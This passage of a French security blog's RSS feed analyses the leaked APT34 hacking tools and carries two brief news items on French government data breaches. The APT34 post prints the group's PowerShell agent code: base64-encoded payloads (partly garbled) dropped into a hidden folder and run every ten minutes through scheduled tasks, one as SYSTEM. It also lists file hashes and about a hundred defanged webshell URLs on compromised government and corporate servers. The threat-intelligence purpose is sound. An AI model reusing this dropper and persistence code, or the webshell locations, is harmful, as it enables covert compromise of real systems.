+${global:$dns_ag} = "JENDQSA9ICJteWxlZnRoZWFydC5jb20iOw0KJEREQSA9IGdldC13bWlvYmplY3QgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWLUVuY29kaW5nIEJ5dGU7DQoJJGUgPSByZXNvbHZlcigkZik7DQoXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JFNTQn0pIC1vciAtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JEFBQn0pKQ0Kew0KCW1kICR7Z2xvYmFsOiRTU0J9Ow0KCW1kICR7Z2xvYmFsOiRBQUJ9Ow0KCW1kICR7Z2xvYmFsOiRRUUF9Ow0KCW1kICR7Z2xvYmFsOiRUVEJ9Ow0KfQ0KcmVjZWl2ZTsNCnByb2Nlc3NvcjsNCnNlbmQ7";
+${global:$http_ag} = "JEJCQSA9ICJodHRwOi8vIiArIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoIm15bGVmdGhlYXJ0LmNvbSIpDQoke2dsb2JhbDokQ0NBfSA9IG5ldy1vYmplY3Qgc3lzdGVtLm5ldC5XZWJDbGllbnQNCiR0ID0gZ2V0LXdtaW9iamVjdCBXaW4zMAtZXEgIjEiKSB7DQoJCQkJJHIgPSAkdHJ1ZTsNCgkJCX0NCgkJCWlmKCRUVEEgLW5lICJub3QiIC1hbmQgJFRUQSkgew0KCQkJCSR7Z2xvYmFsOiRDQ0F9LlVwbG9hZEZpbGUoIiRCQkEvcmVzLyRQUEEkVFRBIiwgJHApOw0KCQkJCVJlbW92ZS1JdGVtICRwIC1Gb3JjZQ0KCQkJfQ0KCQl9DQoJfQ0KfQ==";
+ 
+if (-not (Test-Path -Path ${global:$address1}))
+{md ${global:$address1}; Get-Item ${global:$address1} -Force | %{$_.attributes = "Hidden"}}
+if (Test-Path -Path ${global:$address1})
+{
+    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$http_ag})) | Set-Content "${global:$address1}hUpdater.ps1";
+    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$dns_ag})) | Set-Content "${global:$address1}dUpdater.ps1";
+    "command0 = `"Powershell.exe -exec bypass -file ${global:$address1}hUpdater.ps1`"`nset Shell0 = CreateObject(`"wscript.shell`")`nshell0.run command0, 0, false`ncommand1 = `"Powershell.exe -exec bypass -file ${global:$address1}dUpdater.ps1`"`nset Shell1 = CreateObject(`"wscript.shell`")`nshell1.run command1, 0, false" | Out-File "${global:$address1}UpdateTask.vbs"
+    schtasks /create /F /sc minute /mo 10 /tn "UpdateTasksUpdateTask" /tr "wscript /b `"${global:$address1}UpdateTask.vbs`"";
+    schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn "UpdateTasksUpdateTaskHosts" /tr "wscript /b `"${global:$address1}UpdateTask.vbs`"";
+}
+</pre>
+<p>En faisant l&rsquo;analyse du code de la partie agent (ou serveur), on peut voir qu&rsquo;il contient deux variables encodées en base64, qui chargent ce qui semble être le premier étage de la charge utile. Il récupère le fichier de configuration à partir de « myleftheart.com » (maintenant fermé), crée un ensemble de dossiers dans « C:  Utilisateurs  Public  Public » et fini en supprimant le fichier. Il crée également deux tâches planifiées, l&rsquo;une avec des privilèges d&rsquo;administrateur et l&rsquo;autre avec des droits d&rsquo;utilisateur normaux, qui exécuteront deux scripts PowerShell: dUpdater.ps1 et hUpdater.ps toutes les 10 minutes.</p>
+<p>Un fichier de configuration du payload contiendra ces identifiants d&rsquo;accès: </p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_EWM9AG77A9WWZFF.jpg" alt="image" /></p>
+<h4> Les Webshells </h4>
+<p>Du côté des webshells, on dispose du code de quatre Webshells utilisés largement par le groupe:<br />
+<img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_QNC5DBTTG57W97D.jpg" alt="" /></p>
+<h4> Webmask / DNSpionage </h4>
+<p>Il s&rsquo;agit d&rsquo;un serveur ICAP accompagné des scripts d&rsquo;installations qui semble pouvoir recevoir tous types de données, telles que des identifiants, des cookies &#8230;</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_BHJ8S2TKPAP3DX3.jpg" alt="" /></p>
+<p>Les autres fichiers contiennent de nombreuses clés privées et identifiants d&rsquo;utilisateurs, ainsi que des identifiants Active Directory pour de nombreux domaines le tout trié par cibles:</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_HVBSYBFZEVVUXS7.jpg" alt="" /></p>
+<p>Le reste des informations concerne des membres présumés du groupe dont des profils linkedin, des photos, des numéros de téléphones, des mails&#8230;</p>
+<h4>Les IOC: </h4>
+<pre>
+27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed
+b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768
+2943e69e6c34232dee3236ced38d41d378784a317eeaf6b90482014210fcd459
+07e791d18ea8f2f7ede2962522626b43f28cb242873a7bd55fff4feb91299741
+dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229
+3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62
+c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e
+a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e
+fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392
+</pre>
+<h4>Les accès Webshells: </h4>
+<pre>
+hxxps://202.183.235.31/owa/auth/signout.aspx
+hxxps://202.183.235.4/owa/auth/signout.aspx
+hxxps://122.146.71.136/owa/auth/error3.aspx
+hxxps://59.124.43.229/owa/auth/error0.aspx
+hxxps://202.134.62.169/owa/auth/signin.aspx
+hxxps://202.164.27.206/owa/auth/signout.aspx
+hxxps://213.14.218.51/owa/auth/logon.aspx
+hxxps://88.255.182.69/owa/auth/getidtoken.aspx
+hxxps://95.0.139.4/owa/auth/logon.aspx
+hxxps://1.202.179.13/owa/auth/error1.aspx
+hxxps://1.202.179.14/owa/auth/error1.aspx
+hxxps://114.255.190.1/owa/auth/error1.aspx
+hxxps://180.166.27.217/owa/auth/error3.aspx
+hxxps://180.169.13.230/owa/auth/error1.aspx
+hxxps://210.22.172.26/owa/auth/error1.aspx
+hxxps://221.5.148.230/owa/auth/outlook.aspx
+hxxps://222.178.70.8/owa/auth/outlook.aspx
+hxxps://222.66.8.76/owa/auth/error1.aspx
+hxxps://58.210.216.113/owa/auth/error1.aspx
+hxxps://60.247.31.237/owa/auth/error3.aspx
+hxxps://60.247.31.237/owa/auth/logoff.aspx
+hxxps://202.104.127.218/owa/auth/error1.aspx
+hxxps://202.104.127.218/owa/auth/exppw.aspx
+hxxps://132.68.32.165/owa/auth/logout.aspx
+hxxps://132.68.32.165/owa/auth/signout.aspx
+hxxps://209.88.89.35/owa/auth/logout.aspx
+hxxps://114.198.235.22/owa/auth/login.aspx
+hxxps://114.198.237.3/owa/auth/login.aspx
+hxxps://185.10.115.199/owa/auth/logout.aspx
+hxxps://195.88.204.17/owa/auth/logout.aspx
+hxxps://46.235.95.125/owa/auth/signin.aspx
+hxxps://51.211.184.170/owa/auth/owaauth.aspx
+hxxps://91.195.89.155/owa/auth/signin.aspx
+hxxps://82.178.124.59/owa/auth/gettokenid.aspx
+hxxps://83.244.91.132/owa/auth/logon.aspx
+hxxps://195.12.113.50/owa/auth/error3.aspx
+hxxps://78.100.87.199/owa/auth/logon.aspx
+hxxps://110.74.202.90/owa/auth/errorff.aspx
+hxxps://211.238.138.68/owa/auth/error1.aspx
+hxxps://168.63.221.220/owa/auth/error3.aspx
+hxZps://213.189.82.221/owa/auth/errorff.aspx
+hxxps://205.177.180.161/owa/auth/erroref.aspx
+hxxps://77.42.251.125/owa/auth/logout.aspx
+hxxps://202.175.114.11/owa/auth/error1.aspx
+hxxps://202.175.31.141/owa/auth/error3.aspx
+hxxps://213.131.83.73/owa/auth/error4.aspx
+hxxps://187.174.201.179/owa/auth/error1.aspx
+hxxps://200.33.162.13/owa/auth/error3.aspx
+hxxps://202.70.34.68/owa/auth/error0.aspx
+hxxps://202.70.34.68/owa/auth/error1.aspx
+hxxps://197.253.14.10/owa/auth/logout.aspx
+hxxps://41.203.90.221/owa/auth/logout.aspx
+hxxp://www.abudhabiairport.ae/english/resources.aspx
+hxxps://mailkw.agility.com/owa/auth/RedirSuiteService.aspx
+hxxp://www.ajfd.gov.ae/_layouts/workpage.aspx
+hxxps://mail.alfuttaim.ae/owa/auth/change_password.aspx
+hxxps://mail.alraidah.com.sa/owa/auth/GetLoginToken.aspx
+hxxp://www.alraidah.com.sa/_layouts/WrkSetlan.aspx
+hxxps://webmail.alsalam.aero/owa/auth/EventClass.aspx
+hxxps://webmail.bix.bh/owa/auth/Timeoutctl.aspx
+hxxps://webmail.bix.bh/owa/auth/EventClass.aspx
+hxxps://webmail.bix.bh/ecp/auth/EventClass.aspx
+hxxps://webmail.citc.gov.sa/owa/auth/timeout.aspx
+hxxps://mail.cma.org.sa/owa/auth/signin.aspx
+hxxps://mail.dallah-hospital.com/owa/auth/getidtokens.aspx
+hxxps://webmail.dha.gov.ae/owa/auth/outlookservice.aspx
+hxxps://webmail.dnrd.ae/owa/auth/getidtoken.aspx
+hxxp://dnrd.ae:8080/_layouts/WrkStatLog.aspx
+hxxps://www.dns.jo/statistic.aspx
+hxxps://webmail.dsc.gov.ae/owa/auth/outlooklogonservice.aspx
+hxxps://e-albania.al/dptaktkonstatim.aspx
+hxxps://owa.e-albania.al/owa/auth/outlookdn.aspx
+hxxps://webmail.eminsco.com/owa/auth/outlookfilles.aspx
+hxxps://webmail.eminsco.com/owa/auth/OutlookCName.aspx
+hxxps://webmail.emiratesid.ae/owa/auth/RedirSuiteService.aspx
+hxxps://mailarchive.emiratesid.ae/EnterpriseVault/js/jquery.aspx
+hxxps://webmail.emiratesid.ae/owa/auth/handlerservice.aspx
+hxxp://staging.forus.jo/_layouts/explainedit.aspx
+hxxps://government.ae/tax.aspx
+hxxps://formerst.gulfair.com/GFSTMSSSPR/webform.aspx
+hxxps://webmail.ictfund.gov.ae/owa/auth/owaauth.aspx
+hxxps://jaf.mil.jo/ShowContents.aspx
+hxxp://www.marubi.gov.al/aspx/viewpercthesaurus.aspx
+hxxps://mail.mindware.ae/owa/auth/outlooktoken.aspx
+hxxps://mail.mis.com.sa/owa/auth/Redirect.aspx
+hxxps://webmail.moe.gov.sa/owa/auth/redireservice.aspx
+hxxps://webmail.moe.gov.sa/owa/auth/redirectcache.aspx
+hxxps://gis.moei.gov.ae/petrol.aspx
+hxxps://gis.moenr.gov.ae/petrol.aspx
+hxxps://m.murasalaty.moenr.gov.ae/signproces.aspx
+hxxps://mail.mofa.gov.iq/owa/auth/RedirSuiteService.aspx
+hxxp://ictinfo.moict.gov.jo/DI7Web/libraries/aspx/RegStructures.aspx
+hxxp://www.mpwh.gov.jo/_layouts/CreateAdAccounts.aspx
+hxxps://mail.mygov.ae/owa/auth/owalogin.aspx
+hxxps://ksa.olayan.net/owa/auth/signin.aspx
+hxxps://mail.omantourism.gov.om/owa/auth/GetTokenId.aspx
+hxxps://email.omnix-group.com/owa/auth/signon.aspx
+hxxps://mail.orange-jtg.jo/OWA/auth/signin.aspx
+hxxp://fwx1.petra.gov.jo/SEDCOWebServer/global.aspx
+hxxp://fwx1.petranews.gov.jo/SEDCOWebServer/content/rtl/QualityControl.aspx
+hxxps://webmail.presflt.ae/owa/auth/logontimeout.aspx
+hxxps://webmail.qchem.com/OWA/auth/RedirectCache.aspx
+hxxps://meet.saudiairlines.com/ClientResourceHandler.aspx
+</pre>
+<p>Même si 18 Mo ont l&rsquo;air de rien comme ça, il s&rsquo;agit d&rsquo;une fuite très critique étant donné la nature très sensible (voire secret défense) des informations dont elle fait l&rsquo;objet.</p>
+<p>Grâce à ces fuites on comprend mieux comment ce groupe opère. On sait par exemple à quoi ressemble leur serveur de contrôle et de commande et comment ils commandent les hôtes infectés: une interface Web dédiée nommée ScareCrow est utilisée (Épouvantail pour les plus Anglophobes 🙂 )</p>
+<p>En bref, affaire à suivre donc</p>
+<h4>sources</h4>
+<p>https://malware-research.org/apt34-hacking-tools-leak/<br />
+https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html<br />
+https://bbs.pediy.com/thread-250874.htm</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/apt-34-pirate-18-mo-de-donnees-dans-la-nature/">APT 34 piraté &#8211; 18 Mo de données dans la nature</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>France: piratage du quai d&#8217;Orsay</title>
+		<link>https://hackonch.ml/fr/drama-alert/france-piratage-du-quai-dorsay-2/</link>
+				<pubDate>Sun, 16 Dec 2018 18:45:55 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Drama Alert]]></category>
+
+		<guid isPermaLink="false">https://tchernobyl.ml/?p=472</guid>
+				<description><![CDATA[<div class="post-excerpt">Après le syndicat de la police nationale Alliance c&#8217;est maintenant au tour du quai d&#8217;Orsay de se faire pirater. En effet, c&#8217;est dans la nuit du jeudi 13 décembre 2018,&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/drama-alert/france-piratage-du-quai-dorsay-2/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/france-piratage-du-quai-dorsay-2/">France: piratage du quai d&rsquo;Orsay</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[
+<p>Après le syndicat de la police nationale Alliance c&rsquo;est maintenant au tour du quai d&rsquo;Orsay de se faire pirater. </p>
+
+
+
+<p>En effet, c&rsquo;est dans la nuit du jeudi 13 décembre 2018, que le service « Arianne », une sorte de newsletter du citoyen à l&rsquo;étranger pour savoir si ça craint pas trop sur place s&rsquo;est fait piraté. Arianne s&rsquo;est alors fait dépouillé de ses quelques  540 563 comptes. Les données récupérées par les sauvageons incluent des noms, prénoms, numéro de téléphone et des adresses mails. L&rsquo;inquiétude grandi et on craint maintenant que les sites de l&rsquo;État vont tomber un à un comme en Estonie. Espérons juste que des gouvernements ne vont pas profiter du dawa actuel et lancer leurs ordes d&rsquo;APT. </p>
+
+
+
+<p>Affaire à suivre donc et sortez couverts les enfants </p>
+
+
+
+<p class="has-text-color has-vivid-cyan-blue-color">@tchernobyl</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/france-piratage-du-quai-dorsay-2/">France: piratage du quai d&rsquo;Orsay</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>France: Piratage des coordonnées de 500 policiers</title>
+		<link>https://hackonch.ml/fr/drama-alert/france-piratage-des-coordonnees-de-500-policiers/</link>
+				<pubDate>Sun, 16 Dec 2018 18:24:47 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Drama Alert]]></category>
+
+		<guid isPermaLink="false">https://tchernobyl.ml/?p=466</guid>
+				<description><![CDATA[<div class="post-excerpt">Entre émeutes et fusillades c&#8217;est maintenant au tour des sites administrés par l&#8217;État de se faire pirater. En effet, l&#8217;application « permutation », une sorte de parcoursup de la police nationale pour&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/drama-alert/france-piratage-des-coordonnees-de-500-policiers/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/france-piratage-des-coordonnees-de-500-policiers/">France: Piratage des coordonnées de 500 policiers</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[
+<p class="has-drop-cap">Entre émeutes et fusillades c&rsquo;est maintenant au tour des sites administrés par l&rsquo;État de se faire pirater. En effet, l&rsquo;application « permutation », une sorte de parcoursup de la police nationale pour indiquer ses vœux d&rsquo;affectations, a été attaquée par les « Anonymous » d&rsquo;après le syndicat policier Alliance.</p>
+
+
+
+<blockquote class="twitter-tweet" data-lang="en"><p lang="fr" dir="ltr">Alerte cyber attaque !<br>Notre organisation a été la cible d’un piratage informatique orchestré par les « ANONYMOUS ».<br>Seule l’application permutation a été attaquée et seuls ses utilisateurs sont concernés.<a href="https://twitter.com/alliancepolice?ref_src=twsrc%5Etfw">@alliancepolice</a> présente toutes ses excuses à nos collègues.</p>— ALLIANCE PN (@alliancepolice) <a href="https://twitter.com/alliancepolice/status/1072189813229584384?ref_src=twsrc%5Etfw">December 10, 2018</a></blockquote>	 	 
+
+
+
+
+<p>Ce qui m&rsquo;a fait particulièrement sourire c&rsquo;est que dans le tweet, on a droit à la réponse bourrée de fautes d&rsquo;un Anonymous qui prétend qu&rsquo;il ne s&rsquo;agit pas d&rsquo;une action menée par Anonymous mais par des « kikoulol du dimanches ». Quoiqu&rsquo;il en soit, une enquête a été ouverte et confiée à la DGSI pour « entraves au fonctionnement d&rsquo;un système de traitement automatisé de données à caractère personnel mis en oeuvre par l&rsquo;État et en bande organises » et pour « association de malfaiteurs en vue de commettre ce délit ».</p>
+
+
+
+<p>Toujours selon Alliance, la fuite aurait seulement impactée les données les moins sensibles soit seulement les quelques 498 coordonnées incluant noms, emails et numéros de téléphone personnel ainsi que parfois leurs affectations. Un fichier de revendication aurait aussi été laissé dans les serveurs et signé d&rsquo;un triple A pour « Anonymous Anarchist Agency ». Les données auraient été par la suite utilisées afin d&rsquo;envoyer des mails de soutiens aux gilet jaunes aux victimes de la fuite des données.</p>
+
+
+
+<p class="has-text-color has-vivid-cyan-blue-color">@tchernobyl</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/france-piratage-des-coordonnees-de-500-policiers/">France: Piratage des coordonnées de 500 policiers</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
